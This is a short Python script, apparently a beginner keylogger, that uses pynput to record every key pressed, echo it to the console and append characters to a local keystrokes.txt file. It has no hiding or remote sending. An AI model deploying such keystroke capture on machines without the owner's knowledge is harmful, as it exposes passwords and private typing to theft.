from pynput import keyboard #import

#function 
def keyPressed(key):
    print(str(key)) #keys printing on cmd prompt
    with open("keystrokes.txt", 'a') as logKey: #pressed data store on the txt file
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
